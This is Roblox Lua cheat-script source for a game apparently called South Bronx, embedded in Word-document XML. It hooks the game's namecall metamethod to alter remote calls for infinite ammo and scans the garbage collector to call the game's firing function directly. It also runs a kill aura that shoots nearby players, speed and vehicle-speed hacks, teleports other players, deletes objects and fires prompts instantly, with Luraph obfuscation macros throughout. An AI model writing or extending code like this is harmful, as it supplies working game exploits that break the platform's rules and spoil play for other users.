    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            local Module = Weapon:FindFirstChildOfClass("ModuleScript")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if Module and Module.Name == "Setting" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Module = require(Module)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if type(Module) == "table" and not OldWeaponValues[Weapon.Name] then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                OldWeaponValues[Weapon.Name] = {}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                local OldConfig = OldWeaponValues[Weapon.Name]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                for Index, Value in next, Module do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    OldConfig[Index] = Value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</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not LocalPlayer.Character then LocalPlayer.CharacterAdded:Wait() end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                LocalPlayer.Character.ChildAdded:Connect(LPH_NO_VIRTUALIZE(function(Weapon)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Weapon:IsA("Tool") then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Weapon:FindFirstChild("Setting") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        CurrentGunHeld = Weapon</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    SetValues(); ModWeapon(Weapon);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                LocalPlayer.Backpack.ChildAdded:Connect(LPH_NO_VIRTUALIZE(function(Weapon)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Weapon:IsA("Tool") then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Weapon:FindFirstChild("Setting") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        CurrentGunHeld = Weapon</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    SetValues(); ModWeapon(Weapon);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                LocalPlayer.CharacterAdded:Connect(function(Character)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Character.ChildAdded:Connect(LPH_NO_VIRTUALIZE(function(Weapon)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not Weapon:IsA("Tool") then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Weapon:FindFirstChild("Setting") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            CurrentGunHeld = Weapon</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        SetValues(); ModWeapon(Weapon);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    LocalPlayer.Backpack.ChildAdded:Connect(LPH_NO_VIRTUALIZE(function(Weapon)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not Weapon:IsA("Tool") then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Weapon:FindFirstChild("Setting") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            CurrentGunHeld = Weapon</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        SetValues(); ModWeapon(Weapon);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local ConfigMetatable = getmetatable(Config.South_Bronx.Modifications)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ConfigMetatable.__index = LPH_NO_VIRTUALIZE(function(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    return Config.South_Bronx._Modifications[select(2, ...)]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ConfigMetatable.__newindex = LPH_NO_VIRTUALIZE(function(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local Index, Value = select(2, ...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.South_Bronx._Modifications[Index] = Value; ModWeapons()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                --[[local OldGunSettingsHook ; OldGunSettingsHook = hookmetamethod(game, "__namecall", LPH_NO_VIRTUALIZE(function(Self, ...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if CurrentGunHeld == nil then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        return OldGunSettingsHook(Self, ...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if getnamecallmethod() == "FireServer" or getnamecallmethod() == "InvokeServer" and CurrentGunHeld then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local Arguments = {...}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        for Index, Value in Arguments do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if typeof(Value) == "table" and rawget(Value , "Ammo") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Value = OldWeaponValues[CurrentGunHeld.Name]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                return OldGunSettingsHook(Self, unpack(Arguments))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    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    return OldGunSettingsHook(Self, ...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local OldMagAndAmmo; OldMagAndAmmo = hookmetamethod(game, "__namecall", LPH_NO_VIRTUALIZE(function(Self, ...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if CurrentGunHeld == nil then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        return OldMagAndAmmo(Self, ...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if getnamecallmethod() == "FireServer" or getnamecallmethod() == "InvokeServer" and tostring(Self) == "ChangeMagAndAmmo" and (Config.South_Bronx._Modifications.InfiniteAmmo or Config.South_Bronx._Modifications.InfiniteClips) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local Arguments = {...}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Config.South_Bronx._Modifications.InfiniteAmmo then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Arguments[2] = OldWeaponValues[CurrentGunHeld.Name].AmmoPerMag</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        return OldMagAndAmmo(Self, unpack(Arguments))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    return OldMagAndAmmo(Self, ...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end))]]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            --[[if not Solara then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local DeleteChatPlayer = LPH_NO_VIRTUALIZE(function(Player)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Player.Character then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local Head = Player.Character:FindFirstChild("Head")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Head then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if Head:FindFirstChild("chatpart") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Head:FindFirstChild("chatpart"):Destroy()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/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Player.CharacterAdded:Connect(function(Character)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Character:WaitForChild("Head")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Character.Head:WaitForChild("chatpart"):Destroy()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for Index, Value in Players:GetPlayers() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Value == LocalPlayer then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    DeleteChatPlayer(Value)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Players.PlayerAdded:Connect(DeleteChatPlayer)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end]]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            --[[local FireFunc, FireFuncs = LPH_NO_VIRTUALIZE(function(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return ...</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end), {}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local RefreshFireFunc = LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for Index, Value in getgc() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if typeof(Value) == "function" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local Info = debug.getinfo(Value)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Info.source == string.format("=Players.%s.PlayerScripts.Main.Modules.GunScript_Local", LocalPlayer.Name) and not table.find(FireFuncs, Value) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            FireFunc = Value</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            table.insert(FireFuncs, FireFunc)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RefreshFireFunc()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            LocalPlayer.CharacterAdded:Connect(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                task.wait(5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                RefreshFireFunc()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ShootPlayer = LPH_NO_VIRTUALIZE(function(Player)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not LocalPlayer.Character then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    return </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not LocalPlayer.Character:FindFirstChildOfClass("Tool") then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local Tool = LocalPlayer.Character:FindFirstChildOfClass("Tool"); local Handle = Tool:FindFirstChild("Handle")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not Tool:FindFirstChild("Settings") then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not Players:FindFirstChild(Player) then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local Player = Players:FindFirstChild(Player)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not Player.Character or not Player.Character:FindFirstChild("Head") or not Player.Character:FindFirstChild("Humanoid") or Player.Character:FindFirstChild("Humanoid"):GetState() == Enum.HumanoidStateType.Dead then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not FireFunc then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    RefreshFireFunc()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                print("Fired")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                FireFunc(Tool, Handle, Player.Character:FindFirstChild("Head").Position)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            task.spawn(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                while task.wait(0.1) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Config.South_Bronx.KillAura then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChildOfClass("Tool") or not LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("Setting") then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    for Index, Value in Players:GetPlayers() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if table.find(Config.South_Bronx.KillAuraWhitelist, tostring(Value)) then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Value == LocalPlayer then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not Value.Character or not Value.Character:FindFirstChildOfClass("Humanoid") or not Value.Character:FindFirstChild("HumanoidRootPart") then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Value.Character:FindFirstChildOfClass("Humanoid").Health == 0 then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Value.Character:FindFirstChildOfClass("ForceField") then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not DistanceCheck(Value, Config.South_Bronx.KillAuraRange) then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ShootPlayer(Value.Name)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end))]]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            task.spawn(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                while true do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local Delta = RunService.Heartbeat:Wait()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Config.South_Bronx.LocalPlayer_Config.Speed then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local Humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Humanoid.MoveDirection.Magnitude &gt; 0 then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            local SpeedFactor = (Humanoid.WalkSpeed &gt;= 10) and 1 or 0.54</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            LocalPlayer.Character:TranslateBy(</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Humanoid.MoveDirection * Config.South_Bronx.LocalPlayer_Config.SpeedValue </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                * Delta * 10 * SpeedFactor</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            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task.wait() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Config.South_Bronx.PlayerUtilities.BringingPlayer then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if tostring(Config.South_Bronx.PlayerUtilities.SelectedPlayer) == tostring(LocalPlayer) then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") or not Players:FindFirstChild(Config.South_Bronx.PlayerUtilities.SelectedPlayer) or not Players:FindFirstChild(Config.South_Bronx.PlayerUtilities.SelectedPlayer).Character or not Players:FindFirstChild(Config.South_Bronx.PlayerUtilities.SelectedPlayer).Character:FindFirstChild("HumanoidRootPart") then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Players:FindFirstChild(Config.South_Bronx.PlayerUtilities.SelectedPlayer).Character:FindFirstChild("HumanoidRootPart").CFrame = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame + Vector3.new(2, 0, 0)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    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            task.spawn(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                while true do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.wait(0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Config.South_Bronx.VehicleModifications.SpeedEnabled and UserInputService:IsKeyDown(Enum.KeyCode.W) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if LocalPlayer.Character and typeof(LocalPlayer.Character) == "Instance" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                local Humanoid = LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                if Humanoid and typeof(Humanoid) == "Instance" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    local SeatPart = Humanoid.SeatPart</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    if SeatPart and typeof(SeatPart) == "Instance" and SeatPart:IsA("VehicleSeat") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        SeatPart.AssemblyLinearVelocity *= Vector3.new(1 + Config.South_Bronx.VehicleModifications.SpeedValue, 1, 1 + Config.South_Bronx.VehicleModifications.SpeedValue)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    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            task.spawn(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                while true do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.wait(0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Config.South_Bronx.VehicleModifications.BreakEnabled and UserInputService:IsKeyDown(Enum.KeyCode.S) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if LocalPlayer.Character and typeof(LocalPlayer.Character) == "Instance" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                local Humanoid = LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                if Humanoid and typeof(Humanoid) == "Instance" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    local SeatPart = Humanoid.SeatPart</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    if SeatPart and typeof(SeatPart) == "Instance" and SeatPart:IsA("VehicleSeat") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        SeatPart.AssemblyLinearVelocity *= Vector3.new(1 - Config.South_Bronx.VehicleModifications.BreakValue, 1, 1 - Config.South_Bronx.VehicleModifications.BreakValue)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    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            UserInputService.InputBegan:Connect(function(Input, GameProcessedEvent)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Input.KeyCode == Config.South_Bronx.VehicleModifications.InstantStopBind and Config.South_Bronx.VehicleModifications.InstantStop and (not GameProcessedEvent) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if LocalPlayer.Character and typeof(LocalPlayer.Character) == "Instance" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            local Humanoid = LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if Humanoid and typeof(Humanoid) == "Instance" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                local SeatPart = Humanoid.SeatPart</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                if SeatPart and typeof(SeatPart) == "Instance" and SeatPart:IsA("VehicleSeat") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    SeatPart.AssemblyLinearVelocity *= Vector3.new(0, 0, 0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    SeatPart.AssemblyAngularVelocity *= Vector3.new(0, 0, 0)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Config.South_Bronx.LocalPlayer_Config.DeleteKey ~= nil and Input.UserInputType == Enum.UserInputType.MouseButton1 and UserInputService:IsKeyDown(Config.South_Bronx.LocalPlayer_Config.DeleteKey) and Config.South_Bronx.LocalPlayer_Config.DeleteOnKey and (not GameProcessedEvent) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Mouse and Mouse.Target then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Mouse.Target:Destroy()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ProximityPromptService.PromptButtonHoldBegan:Connect(LPH_NO_VIRTUALIZE(function(Prompt, Player)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Prompt and Player == LocalPlayer and fireproximityprompt then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Config.South_Bronx.LocalPlayer_Config.InstantInteract then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        fireproximityprompt(Prompt)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
